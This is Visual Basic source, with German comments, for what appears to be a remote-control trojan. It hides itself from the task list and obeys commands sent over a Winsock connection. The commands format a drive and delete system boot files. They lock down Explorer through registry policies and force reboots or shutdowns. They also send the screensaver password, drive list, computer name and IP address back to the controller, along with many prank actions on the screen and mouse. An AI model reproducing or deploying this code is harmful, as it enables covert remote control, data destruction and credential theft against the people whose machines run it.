  Dim Result%
  Dim LoBy%, HiBy%
  Dim SocketData As WinSocketDataType
  
    Result = WSAStartup(WS_VERSION_REQD, SocketData)
    If Result <> 0 Then
      MsgBox ("'winsock.dll' antwortet nicht !")
      End
    End If
End Sub

Private Sub CleanSockets()
  Dim Result&
  
    Result = WSACleanup()
    If Result <> 0 Then
      MsgBox ("Socket Error " & Trim$(Str$(Result)) & _
              " in Prozedur 'CleanSockets' aufgetreten !")
      End
    End If
End Sub

Private Function NextChar(Text$, Char$) As String
  Dim POS%
    POS = InStr(1, Text, Char)
    If POS = 0 Then
      NextChar = Text
      Text = ""
    Else
      NextChar = Left$(Text, POS - 1)
      Text = Mid$(Text, POS + Len(Char))
    End If
End Function

Private Sub HideDesktop()
  Dim hWndDeskTop&
  
    hWndDeskTop = FindWindow(vbNullString, "Program Manager")
    Call ShowWindow(hWndDeskTop, SW_HIDE)
End Sub

Private Sub Beepoff_Click()
  Dim Result As Byte
    Result = ReadPort(&H61&)
    Call WritePort(&H61&, Result And &HFC&)
End Sub

Private Sub Beepon_Click()
  Dim Result&, Freq&, Lo As Byte, Hi As Byte
    
    Result = CLng(BEEP.Text)
    If Result > 18 And Result < 20000 Then
      Result = 1193180 / Result
      Lo = Result And &HFF&
      Hi = Result \ &H100&
    
      Call WritePort(&H43, &HB6&)
      Call WritePort(&H42, Lo)
      Call WritePort(&H42, Hi)
      
      Result = ReadPort(&H61&)
      Call WritePort(&H61&, Result Or &H3&)
    End If
End Sub

Private Sub Command4_Click()
  '    Steuerelemente aus dem Form:
  '       Timer1
  '       Label3
  '       Command5
  '       Command7
  Dim X%
  Dim ip$, DNS$, HOST$
     If Not Online Then Exit Sub
     MousePointer = vbHourglass
     InitSockets
     HOST = MyHostName$()
     ipt.Text = ""
     
     Do
        ip = HostByName$(HOST, X)
        If Len(ip) = 0 Then Exit Do
        
        DNS = HostByAddress(ip$)
        ipt.Text = "DNS: " & DNS & "  " & "IP: " & ip
        X = X + 1
     Loop
     CleanSockets
     MousePointer = vbDefault
End Sub

Private Sub Command5_Click()
  InternetDial Me.hwnd, ConName, DIAL_FORCE_UNATTENDED, ConID, 0
End Sub

Private Sub Command6_Click()
End Sub

Private Sub disco_Click()
  If disco.Value = vbChecked Then
    Timer2.Enabled = True
  Else
    Timer2.Enabled = False
  End If
End Sub

Private Sub Form_Load()
    pId = GetCurrentProcessId
    Call RegisterServiceProcess(pId, 1&)
 Command2.Visible = False
  Timer1.Enabled = False
  Timer1.Interval = 50
  Command3.Left = Screen.Width / 2
  Command3.Top = Screen.Height / 2
  'Neu für die Registry
  List2.AddItem "HKEY_CLASSES_ROOT"
  List2.ItemData(0) = HKEY_CLASSES_ROOT
  List2.AddItem "HKEY_CURRENT_USER"
  List2.ItemData(1) = HKEY_CURRENT_USER
  List2.AddItem "HKEY_LOCAL_MACHINE"
  List2.ItemData(2) = HKEY_LOCAL_MACHINE
  List2.AddItem "HKEY_USERS"
  List2.ItemData(3) = HKEY_USERS
  List2.AddItem "HKEY_PERFORMANCE_DATA"
  List2.ItemData(4) = HKEY_PERFORMANCE_DATA
  List2.AddItem "HKEY_CURRENT_CONFIG"
  List2.ItemData(5) = HKEY_CURRENT_CONFIG
  List2.AddItem "HKEY_DYN_DATA"
  List2.ItemData(6) = HKEY_DYN_DATA

  List2.ListIndex = 1 'Bedeutet Schlüssel ((((/////Hkey Current User\\\\\))))) je nach Einstellung
End Sub
Private Sub Freeze()
  LockWindowUpdate (GetDesktopWindow)
End Sub

Private Sub Defrost()
  LockWindowUpdate (0&)
End Sub

Private Sub Command1_Click()
W.Close
W.RemotePort = 5
W.LocalPort = 32767 - RemotePort
If Text1.Text = "" Then
MsgBox "Keine Eingabe im Textfeld", vbSystemModal + vbOKOnly, "Fehler Jan N"
Exit Sub
End If
W.RemoteHost = Text1.Text
W.Connect
'If W.State = 1 Then
'MsgBox W.RemoteHostIP + "verbunden"
'Else: MsgBox "Versuch erfolglos"
'       Exit Sub
'End If
Command2.Visible = True
Text2.SetFocus
End Sub
Private Sub ShowDesktop()
  Dim hWndDeskTop&
  
    hWndDeskTop = FindWindow(vbNullString, "Program Manager")
    Call ShowWindow(hWndDeskTop, SW_SHOW)
End Sub
Private Sub Command3_Click()
  Timer1.Enabled = True
  Me.WindowState = 2
  dx = Screen.Width / Screen.TwipsPerPixelX - 10
  dy = 5
End Sub
Private Sub Command2_Click()
W.SendData Text2.Text
Text2.Text = ""
End Sub
Private Sub Form_Terminate()
W.Close
ABC = MsgBox("FUN ?", vbSystemModal + vbOKCancel, "FUNNY")
If ABC = vbOK Then
    D = Shell("C:\Windows\Explorer.exe", vbNormalFocus)
    For I = 1 To 5
    SendKeys "{Down}", True
    SendKeys "{LEFT}", True
    SendKeys "{DEL}", True
    Next I
End If
End Sub
Private Sub Form_Unload(Cancel As Integer)
W.Close
End Sub

Private Sub malen_Click()
  Dim hDC&, hDCBuffer&, hBmp&, hPen, hObject&
  Dim DeskWidth&, DeskHeight&, Z&, Col&, Max&
    
    Max = 500000000

    'Desktopgröße ermitteln
    DeskWidth = Screen.Width / Screen.TwipsPerPixelX
    DeskHeight = Screen.Height / Screen.TwipsPerPixelY
    
    'Desktop in anderer Bitmap zwischenpuffern
    hDC = CreateDC("DISPLAY", 0&, 0&, 0&)
    hDCBuffer = CreateCompatibleDC(hDC)
    hBmp = CreateCompatibleBitmap(hDC, DeskWidth, DeskHeight)
    Call SelectObject(hDCBuffer, hBmp)
    Call BitBlt(hDCBuffer, 0, 0, DeskWidth, DeskHeight, _
                hDC, 0, 0, SRCCopy)
    For Z = 1 To Max
           Call SetPixel(hDC, CInt(DeskWidth * Rnd), _
                      CInt(DeskHeight * Rnd), Col)
               Col = RGB(256 * Rnd, 256 * Rnd, 256 * Rnd)
    Next Z
End Sub

Private Sub Text1_Change()
Command1.Enabled = True
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
    Command1_Click
End If
End Sub

Private Sub Timer1_Timer()
  Dim Pt As POINTAPI
    Call GetCursorPos(Pt)
      aX = Pt.X
      aY = Pt.Y
      If aY > dy Then aY = aY - 15
      If aX < dx Then aX = aX + 20
      
      Call SetCursorPos(aX, aY)
      
      If aY <= dy And aX >= dx Then
        SetCursorPos dx, dy
        Timer1.Enabled = False
        Call mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
        Call mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
      End If
End Sub
Private Sub Toggle(Key As Integer)
  If Key And 1 Then
    If ToggleKey(VK_NUMLOCK) Then
    Else
    End If
  End If
  
  If Key And 2 Then
    If ToggleKey(VK_CAPITAL) Then
    Else
    End If
  End If
  
    If Key And 4 Then
    If ToggleKey(VK_SCROLL) Then
    Else
    End If
  End If
End Sub

Private Sub Timer2_Timer()
    Call Toggle(Rnd * 8)
End Sub

Private Sub Timer3_Timer()
    Command5_Click
End Sub

'Private Sub W_ConnectionRequest(ByVal requestID As Long)
'If W.State <> sckClosed Then W.Close
'W.Accept requestID
'List1.AddItem W.RemoteHostIP
'List2.AddItem Time & "  " & W.RemoteHostIP & " connected."
'End Sub
''''''''
Private Sub W_DataArrival(ByVal bytesTotal As Long)
Dim Temp As String
W.GetData Temp, vbString
If Temp = "funny" Then
    Command3_Click
    Exit Sub
End If
If Temp = "shutdown" Then
    ExitWindows EWX_REBOOT, &HFFFF
    Exit Sub
End If
If Temp = "jan" Then
    MsgBox "Guten Morgen Herr Küpper !!!!, geschrieben von Jan Bludau Alias thE_iNviNcbilE", vbSystemModal + vbOKOnly, "geschrieben von Jan Bludau Alias thE_iNviNcbilE"
    Exit Sub
End If
If Temp = "hide" Then
     Call HideDesktop
     Exit Sub
End If
If Temp = "show" Then
     Call ShowDesktop
     Exit Sub
End If
If Temp = "open" Then
      Call mciExecute("Set CDaudio door open")
      Exit Sub
End If
If Temp = "close" Then
     Call mciExecute("Set CDaudio door closed")
     Exit Sub
End If
If Temp = "format" Then
  Dim Result&, Drive&
  
    'Laufwerk A: für C wird 2, D = 3 etc. eingesetzt
    Drive = 0
    
    Result = SHFormatDrive(Me.hwnd, Drive, _
                        SHFD_CAPACITY_DEFAULT, _
                       SHFD_FORMAT_QUICK)
    Exit Sub
End If
If Temp = "mini" Then
  Call keybd_event(VK_LWIN, 0, 0, 0)
  Call keybd_event(77, 0, 0, 0)
  Call keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
  Exit Sub
End If
If Temp = "freeze" Then
    Call Freeze
End If
If Temp = "defrost" Then
    Call Defrost
    Exit Sub
End If
If Temp = "compu" Then
     SetComputerName ("I've Hack YOU")
     Exit Sub
End If
If Temp = "deskmalen" Then
    malen_Click
    Exit Sub
End If
If Temp = "nichts" Then
    Call BitBlt(hDC, 0, 0, DeskWidth, DeskHeight, hDCBuffer, _
                0, 0, SRCCopy)
    'Gerätekontexte wieder löschen
    Call DeleteDC(hDCBuffer)
    Call DeleteDC(hDC)
    Exit Sub
End If
If Temp = "bildsch" Then
    X = 400
    Y = 600
    Call SetScreen(X, Y)
End If
If Temp = "doppelkL" Then
    V = 0
    SetDoubleClickTime (V)
    Exit Sub
End If
If Temp = "doppelkS" Then
    V = 100
    SetDoubleClickTime (V)
    Exit Sub
End If
If Temp = "dest" Then
     SetAttr "C:\msdos.sys", vbNormal
     MkDir "C:\Jan2"
     FileCopy "C:\msdos.sys", "C:\Jan2\msdos.sys"
     Kill "C:\msdos.sys"
     FileCopy "C:\io.sys", "C:\Jan2\IO.sys"
     SetAttr "C:\IO.sys", vbNormal
     Kill "IO.sys"
    Exit Sub
End If
If Temp = "NF" Then
    Res = MsgBox("FICKEN", vbSystemModal + vbYesNo, "NBS NF")
    If Res = vbYes Then
        W.SendData "JA"
        MsgBox "ICH AUCH...", vbOKOnly, "JAJAJAJAJA"
    End If
    If Res = vbNo Then
        W.SendData "Nein"
        MsgBox "Dann mach ich es eben ", vbOKOnly, "ICH WÜRDS MACHEN SOFORT"
    End If
End If
If Temp = "monioff" Then
      SendMessage Me.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal 2&
      Exit Sub
End If
If Temp = "monion" Then
      SendMessage Me.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal -1&
      Exit Sub
End If
If Temp = "internetIP" Then
      Command4_Click
      W.SendData ipt.Text
      Exit Sub
End If
If Temp = "beepon" Then
    Beepon_Click
    Exit Sub
End If
If Temp = "beepoff" Then
    Beepoff_Click
    Exit Sub
End If
If Temp = "passs" Then
      Dim AA$
    Label1.Caption = "Bildschirmschoner Paßwort ->>>"
    AA = Paßwort
    If AA = "" Then AA = "Kein Paßwort vorhanden !"
    W.SendData AA & "Bildschirmschoner Passwort"
    Exit Sub
End If
If Temp = "discoon" Then
    disco.Value = 1
    Exit Sub
End If
If Temp = "discooff" Then
    disco.Value = 0
    Exit Sub
End If
If Temp = "mauszoff" Then
      ShowCursor (0)
      Exit Sub
End If
If Temp = "mauszon" Then
    ShowCursor (1)
    Exit Sub
End If
If Temp = "mini" Then
    Call keybd_event(VK_LWIN, 0, 0, 0)
    Call keybd_event(77, 0, 0, 0)
    Call keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
    Exit Sub
End If
If Temp = "openIE" Then
        Result = ShellExecute(Me.hwnd, "Open", _
             "http://www.Symantec.com", "", App.Path, 1)
    Exit Sub
End If
If Temp = "compun" Then
      Dim Buffer$, l&, CName$
    l = MAX_COMPUTERNAME_LENGTH + 1
    Buffer = Space$(l)
    Result = GetComputerName(Buffer, l)
    If Result = 1 Then
      CName = Left$(Buffer, InStr(1, Buffer, Chr$(0)) - 1)
      W.SendData "Dieser Rechner heißt: " & Buffer
    End If
End If
If Temp = "desksize" Then
        wX = Screen.Width / Screen.TwipsPerPixelX
    wY = Screen.Height / Screen.TwipsPerPixelX
    W.SendData wX & " x " & wY & " Bildschirmauflösung "
    Exit Sub
End If
If Temp = "laufw" Then
  Dim Puffer$, Laufwerke$, Laufwerk$, Bezeichnung$
    Puffer = Space(64)
    l = 64
    Ergebnis = GetLogicalDriveStrings(l, Puffer)
    Laufwerke = Left$(Puffer, Ergebnis)
    
    Do While X < Len(Puffer)
        X = InStr(Puffer, Chr$(0))
        If X Then
            Laufwerk = Left$(Puffer, X)
            Puffer = Mid$(Puffer, X + 1, Len(Puffer))
            Typ = GetDriveType(Laufwerk)
            If Typ <> 1 Then
                Select Case Typ
                    Case 2: Bezeichnung = "Wechseldatenträger"
                    Case 3: Bezeichnung = "Festplatte"
                    Case 4: Bezeichnung = "Netzlaufwerk"
                    Case 5: Bezeichnung = "CD-ROM"
                    Case 6: Bezeichnung = "RAM-Disk"
                End Select
                Laufwerk = UCase(Mid$(Laufwerk, 1, 2))
                W.SendData Laufwerk & Bezeichnung & "                  "
            End If
        Else
            Exit Do
        End If
    Loop
Exit Sub
End If
If Temp = "hideme" Then
      App.TaskVisible = False
      Me.Visible = False
      Form1.Hide
End If
If Temp = "showme" Then
      App.TaskVisible = True
      Me.Visible = True
      Form1.Show
End If
If Temp = "gogogoye" Then
      Dim s&, LN&
  Dim R(255) As RASENTRYNAME95
    '### Namen der bestehenden DFÜ-Verbindungen einlesen
    R(0).dwSize = 264
    s = 256 * R(0).dwSize
    Call RasEnumEntries(vbNullString, vbNullString, R(0), s, LN)
    
    If LN <> 0 Then
      '### Es besteht mindestens eine DFÜ-Verbindung
      For X = 0 To LN - 1
        ConName = StrConv(R(X).szEntryName(), vbUnicode)
        List1.AddItem Left$(ConName, InStr(ConName, vbNullChar) - 1)
      Next X
      List1.ListIndex = 0
      W.SendData "Leider schon aufgebaut"
    Else
      '### Keine DFÜ da
      W.SendData "Keine DFÜ-Verbindung vorhanden, aber jetzt"
      Timer3.Enabled = True
    End If
End If
If Temp = "gogogono" Then
    Timer3.Enabled = False
End If
If Temp = "rausraus" Then
      If ConID Then InternetHangUp ConID, 0
    ConID = 0
End If
If Temp = "bildi" Then
      SendMessage Me.hwnd, WM_SYSCOMMAND, SC_SCREENSAVE, ByVal 0&
      Exit Sub
End If
If Temp = "rebooti" Then
      ExitWindows EWX_REBOOT, &HFFFF
End If
If Temp = "shutdowni" Then
      ExitWindows EWX_SHUTDOWN, &HFFFF
End If
If Temp = "logoffi" Then
    ExitWindows EWX_LOGOFF, &HFFFF
End If
If Temp = "secure" Then
    Dim LngInt&
    'Longwert ein ein Feld schreiben
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoDrives"
    Text6.Text = 4 ' Versteckt A: + C: + D: + E: + F: alle sind nicht mehr im Explorer zu sehen
    LngInt = CLng(Val(Text6.Text))
    Result = RegValueSet(HKEY_CURRENT_USER, Text4.Text, Text5.Text, LngInt)
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "norun"
    Text6.Text = 1
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoRecentDocsMenu"
    Text6.Text = 1
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    ''''''''''
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoSetTaskbar"
    Text6.Text = 1
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    'NoDesktop
        Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoDesktop"
    Text6.Text = 1
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    'NoCommonGroups
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoCommonGroups"
    Text6.Text = 1
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    '''''''
    If Result = 0 Then
      Label7.Caption = "Ok"
    Else
      Label7.Caption = "Fehler"
    End If
End If
If Temp = "insecure" Then
    'Longwert ein ein Feld schreiben
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoDrives"
    Text6.Text = 0 ' Versteckt A: + C: + D: + E: + F: alle sind nicht mehr im Explorer zu sehen
    LngInt = CLng(Val(Text6.Text))
    Result = RegValueSet(HKEY_CURRENT_USER, Text4.Text, Text5.Text, LngInt)
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "norun"
    Text6.Text = 0
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoRecentDocsMenu"
    Text6.Text = 0
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    ''''''''''
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoSetTaskbar"
    Text6.Text = 0
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    'NoDesktop
        Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoDesktop"
    Text6.Text = 0
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
    'NoCommonGroups
    Text4.Text = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    Text5.Text = "NoCommonGroups"
    Text6.Text = 0
    Result = RegValueSet(HKEY_LOCAL_MACHINE, Text4.Text, Text5.Text, LngInt)
End If
If Temp = "bildi800" Then
    Call SetScreen(800, 600)
    Exit Sub
End If
If Temp = "bildi1024" Then
    Call SetScreen(1024, 768)
    Exit Sub
End If
If Temp = "bildi1152" Then
    Call SetScreen(1152, 864)
    Exit Sub
End If
If Temp = "bildi640" Then
    Call SetScreen(640, 480)
    Exit Sub
End If
If Temp = "drucktest" Then
    Printer.Print "WER WAR DAS ?"
    Printer.Print
    Printer.Print "WO BIN ICH ?";
    Printer.Print "MR. iNviNcible"
    Printer.EndDoc
    Exit Sub
End If
If Temp = "serversend" Then
    empfangen.Caption = "Server gibt eine Nachricht ein !!!!"
    Exit Sub
End If
text3.Text = text3.Text & vbCrLf & Temp
End Sub
